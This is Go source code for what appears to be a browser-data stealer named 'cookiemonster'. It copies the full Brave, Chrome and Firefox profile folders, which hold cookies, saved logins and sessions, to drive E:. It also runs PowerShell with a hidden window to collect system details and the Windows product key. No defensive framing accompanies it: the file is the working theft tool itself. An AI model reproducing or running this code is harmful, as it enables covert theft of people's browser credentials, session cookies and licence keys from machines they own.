package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"

	cp "github.com/otiai10/copy"
)

var browserPaths = []string{
	"\\BraveSoftware\\Brave-Browser\\User Data",
	"\\Google\\Chrome\\User Data",
	"\\Mozilla\\Firefox\\Profiles",
}

func getDirSize(path string) (float64, error) {
	var size int64
	err := filepath.Walk(path, func(_ string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			size += info.Size()
		}
		return err
	})
	sizeInMB := float64(size) / (1024 * 1024)
	return sizeInMB, err
}

// RunPowerShell executes a command in PowerShell
func RunPowerShell(cmd string) (string, error) {
	c := exec.Command("powershell.exe", cmd)
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := c.CombinedOutput()

	return string(output[:]), err
}

func getSysInfo() ([]string, error) {
	sysInfo := []string{}

	Win32_ComputerSystem, err := RunPowerShell("Get-WmiObject -Namespace root\\cimv2 -Class Win32_ComputerSystem")
	if err != nil {
		return sysInfo, err
	}
	sysInfo = append(sysInfo, Win32_ComputerSystem)

	WindowsProductKey, err := RunPowerShell("(Get-WmiObject -query ‘select * from SoftwareLicensingService’).OA3xOriginalProductKey")
	if err != nil {
		return sysInfo, err
	}
	sysInfo = append(sysInfo, WindowsProductKey)

	// write sysInfo to file
	file, err := os.Create("E:\\sysInfo.txt")
	if err != nil {
		return sysInfo, err
	}
	defer file.Close()

	for _, info := range sysInfo {
		infoBytes := []byte(info)
		_, err := file.Write(infoBytes)

		if err != nil {
			log.Println(err.Error())
		}
	}

	return sysInfo, nil
}

func main() {
	file, err := os.OpenFile("E:\\cookiemonster.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		os.Exit(1)
	}
	defer file.Close()
	log.SetOutput(file)

	destPath := "E:\\"
	localAppData := os.Getenv("LOCALAPPDATA")

	// iterate through all browser paths in appdata local directory
	for _, path := range browserPaths {
		browserPath := localAppData + path

		// check if browser path exists
		fileInfo, err := os.Stat(browserPath)
		if os.IsNotExist(err) {
			// fmt.Println("(-) " + browserPath + " does not exist: " + err.Error())
			log.Fatalf("(-) %s does not exist: %v", browserPath, err)
		}
		if !fileInfo.IsDir() {
			// fmt.Println("(-) " + browserPath + " is not a directory")
			log.Fatalf("(-) %s is not a directory: %v", browserPath, err)
		}

		// if everything is correct
		if err == nil && fileInfo.IsDir() {
			// get dirSize as size in MB
			dirSize, err := getDirSize(browserPath)
			if err != nil {
				// fmt.Println(err)
				log.Fatalf("(-) failed to get dir size: %v", err)
			}

			// print out dir size
			dirSizeStr := fmt.Sprintf("%d", int(dirSize))
			// fmt.Println("(+) " + browserPath + " size: " + dirSizeStr + " MB")
			// fmt.Println("(+) Starting copy process of " + browserPath)
			log.Println("(+) " + browserPath + " size: " + dirSizeStr + " MB")
			log.Println("(+) Starting copy process of " + browserPath)

			// copy path to directory (not working currently)
			err = cp.Copy(browserPath, destPath+path)
			if err != nil {
				// fmt.Println("(-) Error copying " + destPath + " to " + destPath + ":" + err.Error())
				log.Fatalf("(-) %s -> error copying: %v", browserPath, err)
			} else {
				// fmt.Println("(+) Successfully copied " + destPath + " to " + destPath)
				log.Printf("(+) %s -> successfully copied\n", browserPath)
			}
		}
	}
	_, err = getSysInfo()
	if err != nil {
		log.Fatalf(err.Error())
	}

	log.Println("(!) THE END....")
}
